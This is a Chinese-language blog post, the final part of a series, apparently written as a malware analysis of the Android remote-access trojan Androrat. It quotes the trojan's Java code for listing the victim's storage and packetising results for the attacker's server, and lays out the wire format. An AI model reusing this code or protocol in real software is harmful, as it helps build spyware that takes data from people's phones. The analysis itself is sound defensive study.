@@ -1,0 +1,307 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+
+  <head>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+
+  <!-- Enable responsiveness on mobile devices-->
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+
+  <title>
+    
+      剖析安卓木马Androrat（终） &middot; 奇门遁甲
+    
+  </title>
+
+  <!-- CSS -->
+  <link rel="stylesheet" href="/public/css/poole.css">
+  <link rel="stylesheet" href="/public/css/syntax.css">
+  <link rel="stylesheet" href="/public/css/hyde.css">
+  <link rel="stylesheet" href="/public/css/label.css">
+  <link rel="stylesheet" href="/public/css/global.css">
+
+  <!-- Icons -->
+  <link rel="shortcut icon" href="/public/favicon.ico">
+
+  <!-- RSS -->
+  <link rel="alternate" type="application/rss+xml" title="RSS" href="/atom.xml">
+
+</head>
+
+
+  <body class="theme-base-ff">
+
+    <div class="sidebar">
+  <div class="container sidebar-sticky">
+    <div class="sidebar-about">
+      <h1>
+        <a href="/">
+          奇门遁甲
+        </a>
+      </h1>
+      <p class="lead"></p>
+    </div>
+
+    <nav class="sidebar-nav">
+      <a class="sidebar-nav-item" href="/">Home</a>
+
+
+      </ul>
+      
+
+      
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/about.html">About</a>
+          
+        
+      
+        
+      
+        
+      
+        
+          
+        
+      
+        
+          
+            <a class="sidebar-nav-item" href="/tags.html">标签</a>
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+        
+          
+        
+      
+
+        <a class="sidebar-nav-item" href="/categories.html" >文章分类</a>
+        <ul class="sidebar-nav-subitem">
+            
+            <li><a href="/categories.html#读书">读书 <small>(4)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#随想">随想 <small>(5)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#技术">技术 <small>(9)</small></a>
+            </li>
+            
+            <li><a href="/categories.html#no-category">未分类</a>
+            </li>
+        </ul>
+    </nav>
+
+  </div>
+</div>
+
+
+    <div class="content container">
+      <div class="post">
+  <h1 class="post-title">剖析安卓木马Androrat（终）</h1>
+  <p>
+      <span >09 Apr 2017 by
+          <a href="#">tang3</a>
+      </span>&nbsp;&nbsp;
+      
+  </p>
+  <h2 id="0x00-前言">0x00 前言</h2>
+
+<p>前面的两篇文章已经将Androrat的主要功能和处理方式分析的差不多了，这篇文章来做一些收尾的工作，将之前没有说的命令执行结果发送至服务端的数据封装过程分析一下，以及这个应用的执行结构图。</p>
+
+<h2 id="0x01-返回数据封装分析">0x01 返回数据封装分析</h2>
+
+<p>以列出目录树这个功能为例，ProcessCommand这部分功能的代码如下：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">commande</span> <span class="o">==</span> <span class="n">Protocol</span><span class="o">.</span><span class="na">LIST_DIR</span><span class="o">)</span>
+		<span class="o">{</span>
+			<span class="n">client</span><span class="o">.</span><span class="na">sendInformation</span><span class="o">(</span><span class="s">"List directory request received"</span><span class="o">);</span>
+			<span class="n">String</span> <span class="n">file</span> <span class="o">=</span> <span class="k">new</span> <span class="n">String</span><span class="o">(</span><span class="n">arguments</span><span class="o">.</span><span class="na">array</span><span class="o">());</span>
+			<span class="k">if</span> <span class="o">(!</span><span class="n">DirLister</span><span class="o">.</span><span class="na">listDir</span><span class="o">(</span><span class="n">client</span><span class="o">,</span> <span class="n">chan</span><span class="o">,</span> <span class="n">file</span><span class="o">))</span>
+				<span class="n">client</span><span class="o">.</span><span class="na">sendError</span><span class="o">(</span><span class="s">"Directory: "</span><span class="o">+</span><span class="n">file</span><span class="o">+</span><span class="s">" not found"</span><span class="o">);</span>
+			
+		<span class="o">}</span> <span class="k">else</span> <span class="k">if</span> <span class="o">(</span><span class="n">commande</span> <span class="o">==</span> <span class="n">Protocol</span><span class="o">.</span><span class="na">GET_FILE</span><span class="o">)</span>
+</code></pre>
+</div>
+
+<p>调用DirLister.listDir这个方法来实现列目录功能，参数为当前环境的Client对象，解析数据后的channel和执行命令所需的参数（这里是“/”）。下面我们来看listDir的代码:</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code>	<span class="kd">public</span> <span class="kd">static</span> <span class="kt">boolean</span> <span class="nf">listDir</span><span class="o">(</span><span class="n">ClientListener</span> <span class="n">c</span><span class="o">,</span> <span class="kt">int</span> <span class="n">channel</span><span class="o">,</span> <span class="n">String</span> <span class="n">dirname</span><span class="o">)</span> <span class="o">{</span>
+		<span class="n">File</span> <span class="n">f</span><span class="o">;</span>
+		<span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">MyFile</span><span class="o">&gt;</span> <span class="n">ar</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ArrayList</span><span class="o">&lt;</span><span class="n">MyFile</span><span class="o">&gt;();</span>
+		
+		<span class="k">if</span><span class="o">(</span><span class="n">dirname</span><span class="o">.</span><span class="na">equals</span><span class="o">(</span><span class="s">"/"</span><span class="o">))</span>
+			<span class="n">f</span> <span class="o">=</span> <span class="n">Environment</span><span class="o">.</span><span class="na">getExternalStorageDirectory</span><span class="o">();</span>
+		<span class="k">else</span>
+			<span class="n">f</span> <span class="o">=</span> <span class="k">new</span> <span class="n">File</span><span class="o">(</span><span class="n">dirname</span><span class="o">);</span>
+		
+		<span class="k">if</span> <span class="o">(!</span><span class="n">f</span><span class="o">.</span><span class="na">exists</span><span class="o">())</span> <span class="o">{</span>
+			<span class="k">return</span> <span class="kc">false</span><span class="o">;</span>
+		<span class="o">}</span> 
+		<span class="k">else</span> <span class="o">{</span>
+			<span class="n">ar</span><span class="o">.</span><span class="na">add</span><span class="o">(</span><span class="n">visitAllDirsAndFiles</span><span class="o">(</span><span class="n">f</span><span class="o">));</span>
+			<span class="n">c</span><span class="o">.</span><span class="na">handleData</span><span class="o">(</span><span class="n">channel</span><span class="o">,</span> <span class="k">new</span> <span class="n">FileTreePacket</span><span class="o">(</span><span class="n">ar</span><span class="o">).</span><span class="na">build</span><span class="o">());</span>
+			<span class="k">return</span> <span class="kc">true</span><span class="o">;</span>
+		<span class="o">}</span>
+	<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>大都是执行功能的代码，就不多说了。我们直接来看倒数第二行，将执行结果先通过FileTreePacket的build进行转换，转换为Byte数组的形式，然后通过Client的handleData方法实现封装和传输。handleData中只有一行调用Connection的sendData方法，这个方法也是一行，调用了Mux的send方法。我们直接来看Mux的send的代码：</p>
+
+<div class="language-java highlighter-rouge"><pre class="highlight"><code><span class="kd">public</span> <span class="kt">void</span> <span class="nf">send</span><span class="o">(</span><span class="kt">int</span> <span class="n">chan</span><span class="o">,</span><span class="kt">byte</span><span class="o">[]</span> <span class="n">data</span><span class="o">)</span>
+	<span class="o">{</span>
+		<span class="k">try</span>
+		<span class="o">{</span>
+			<span class="n">TransportPacket</span> <span class="n">tp</span><span class="o">;</span>
+			<span class="kt">boolean</span> <span class="n">last</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+			<span class="kt">boolean</span> <span class="n">envoieTotal</span> <span class="o">=</span> <span class="kc">false</span><span class="o">;</span>
+			<span class="kt">int</span> <span class="n">pointeurData</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+			<span class="kt">short</span> <span class="n">numSeq</span> <span class="o">=</span> <span class="mi">0</span><span class="o">;</span>
+			<span class="kt">int</span> <span class="n">actualLenght</span><span class="o">;</span>
+
+			<span class="k">while</span> <span class="o">(!</span><span class="n">envoieTotal</span><span class="o">)</span> 
+			<span class="o">{</span>
+				<span class="kt">byte</span><span class="o">[]</span> <span class="n">dataToSend</span><span class="o">;</span>
+
+				
+				<span class="k">if</span> <span class="o">(</span><span class="n">last</span> <span class="o">||</span> <span class="o">((</span><span class="n">Protocol</span><span class="o">.</span><span class="na">HEADER_LENGTH_DATA</span> <span class="o">+</span> <span class="n">data</span><span class="o">.</span><span class="na">length</span><span class="o">)</span> <span class="o">&lt;</span> <span class="n">Protocol</span><span class="o">.</span><span class="na">MAX_PACKET_SIZE</span><span class="o">))</span>
+				<span class="o">{</span>
+					<span class="n">dataToSend</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">Protocol</span><span class="o">.</span><span class="na">HEADER_LENGTH_DATA</span> <span class="o">+</span> <span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="n">pointeurData</span><span class="o">)];</span>
+					<span class="n">last</span> <span class="o">=</span> <span class="kc">true</span> <span class="o">;</span>
+					<span class="n">envoieTotal</span> <span class="o">=</span> <span class="kc">true</span> <span class="o">;</span>
+				<span class="o">}</span>
+				<span class="k">else</span>
+					<span class="n">dataToSend</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">Protocol</span><span class="o">.</span><span class="na">MAX_PACKET_SIZE</span><span class="o">];</span>
+				
+				
+				<span class="n">actualLenght</span> <span class="o">=</span> <span class="n">dataToSend</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="n">Protocol</span><span class="o">.</span><span class="na">HEADER_LENGTH_DATA</span><span class="o">;</span>
+
+
+				<span class="kt">byte</span><span class="o">[]</span> <span class="n">fragData</span> <span class="o">=</span> <span class="k">new</span> <span class="kt">byte</span><span class="o">[</span><span class="n">dataToSend</span><span class="o">.</span><span class="na">length</span><span class="o">-</span><span class="n">Protocol</span><span class="o">.</span><span class="na">HEADER_LENGTH_DATA</span><span class="o">];</span>
+				<span class="n">System</span><span class="o">.</span><span class="na">arraycopy</span><span class="o">(</span><span class="n">data</span><span class="o">,</span> <span class="n">pointeurData</span><span class="o">,</span> <span class="n">fragData</span><span class="o">,</span> <span class="mi">0</span><span class="o">,</span> <span class="n">fragData</span><span class="o">.</span><span class="na">length</span><span class="o">);</span>
+				<span class="n">tp</span> <span class="o">=</span> <span class="k">new</span> <span class="n">TransportPacket</span><span class="o">(</span><span class="n">data</span><span class="o">.</span><span class="na">length</span><span class="o">,</span> <span class="n">actualLenght</span><span class="o">,</span> <span class="n">chan</span><span class="o">,</span> <span class="n">last</span><span class="o">,</span> <span class="n">numSeq</span><span class="o">,</span> <span class="n">fragData</span><span class="o">);</span>
+				<span class="n">dataToSend</span> <span class="o">=</span> <span class="n">tp</span><span class="o">.</span><span class="na">build</span><span class="o">();</span>
+				
+				<span class="n">pointeurData</span> <span class="o">=</span> <span class="n">pointeurData</span> <span class="o">+</span> <span class="n">actualLenght</span><span class="o">;</span>
+				<span class="n">numSeq</span><span class="o">++;</span>
+				<span class="k">if</span> <span class="o">((</span><span class="n">data</span><span class="o">.</span><span class="na">length</span> <span class="o">-</span> <span class="n">pointeurData</span><span class="o">)</span> <span class="o">&lt;=</span> <span class="o">(</span><span class="n">Protocol</span><span class="o">.</span><span class="na">MAX_PACKET_SIZE</span> <span class="o">-</span> <span class="n">Protocol</span><span class="o">.</span><span class="na">HEADER_LENGTH_DATA</span><span class="o">))</span>
+				<span class="o">{</span>
+					<span class="n">last</span> <span class="o">=</span> <span class="kc">true</span><span class="o">;</span>
+				<span class="o">}</span>
+				
+				<span class="n">sender</span><span class="o">.</span><span class="na">send</span><span class="o">(</span><span class="n">dataToSend</span><span class="o">);</span>
+
+			<span class="o">}</span>
+		<span class="o">}</span>
+		<span class="k">catch</span><span class="o">(</span><span class="n">NullPointerException</span> <span class="n">e</span><span class="o">)</span>
+		<span class="o">{</span>
+			<span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">"Ce channel n'est pas index"</span><span class="o">);</span>
+			<span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+		<span class="o">}</span>
+	<span class="o">}</span>
+<span class="o">}</span>
+</code></pre>
+</div>
+
+<p>和上一篇文章讲解码的过程差不多，先判断数据+头部的大小是否超过包的最大值（2048）。如果未超过则构造数据+头部大小的byte数组，last位（参见上一篇文章的服务端发送指令格式）置为true，actualLenght值为发送大小减头部长度。创建fragData数组大小为本次传输的数据大小，将本次传输的内容从存储源数据的data移动到fragData中，然后实例化TransportPacket对象，使用它的build方法来生成传输信息。</p>
+
+<p>若数据+头部的大小超过包的最大值，则last置false，其他操作不变，循环发送直至数据发送完毕。</p>
+
+<p>最后我们可以得到返回数据的结构如下：</p>
+
+<p><img src="/assets/images/2017-04/hexdump.png" alt="hexdump" /></p>
+
+<p>切割后内容与服务端发送指令格式一样</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>totalLength  :00 00 00 28  ==》总共长度，如果分片传递则大于localLength 
+localLength  :00 00 00 28  ==》本包长度 
+lst          :01           ==》是否为最后一个包 
+NumSeq       :00 00        ==》如果是分片，则表示此包为第几个数据包 
+channel      :00 00 00 01  ==》服务端所使用的频道 
+Data         : …………        ==》数据部分
+</code></pre>
+</div>
+
+<h2 id="0x02-程序结构">0x02 程序结构</h2>
+
+<p>按理说程序结构图这部分应该放在第一篇文章中的，不过由于那时对这个程序还没有了解透彻，所以就拖到了最后这篇收尾文章中。如果这我的三篇文章都仔细看过，下面这张图就很好理解，废话不多说直接看图吧：</p>
+
+<p><img src="/assets/images/2017-04/structure.png" alt="structure" /></p>
+
+<h2 id="0x03-总结">0x03 总结</h2>
+
+<p>在分析这个程序的期间，还穿插了对一个恶意apk样本（Xiangce）的分析，对比这两个apk发现Android木马可以针对服务端的响应分为主动式和被动式。</p>
+
+<blockquote>
+  <p>被动式：服务端只负责接收客户端返回信息，所需要的功能都在apk生成时确   定，生成后不再可以修改。</p>
+</blockquote>
+
+<blockquote>
+  <p>主动式：服务端主动发送操控命令，客户端响应命令回传数据，也向客户端发送转换为被动式的命令，例如，当收到短信时向服务端发送此条信息。</p>
+</blockquote>
+
+<p>两种分类中，主动式由于功能大而全，所以需要申请过多的权限，容易在安装时被察觉。被动式功能固定伪装性好，不过灵活性相对较差。Xiangce这个恶意样本是一个偏被动式的恶意样本，功能固定在短信和电话接听这两个主要的方面，之所以说是偏被动，是因为在其功能中有一些需要通过短信发送的方式进行操控的地方。</p>
+
+</div>
+
+<div class="related">
+  <h2>相关文章:</h2>
+  <ul class="related-posts">
+    
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E4%BA%8C.html">
+            剖析安卓木马Androrat（二）
+            <small>09 Apr 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/04/09/%E5%89%96%E6%9E%90%E5%AE%89%E5%8D%93%E6%9C%A8%E9%A9%ACAndrorat-%E4%B8%80.html">
+            剖析安卓木马Androrat（一）
+            <small>09 Apr 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/%E6%8A%80%E6%9C%AF/2017/03/21/%E4%B9%9F%E8%B0%88S2-045.html">
+            也谈S2-045
+            <small>21 Mar 2017</small>
+          </a>
+        </h3>
+      </li>
+    
+    
+  </ul>
+</div>
+
+
+<!-- UY BEGIN -->
+<div id="uyan_frame"></div>
+<script type="text/javascript" src="http://v2.uyan.cc/code/uyan.js?uid=2093529"></script>
+<!-- UY END -->
+
+    </div>
+
+  </body>
+</html>
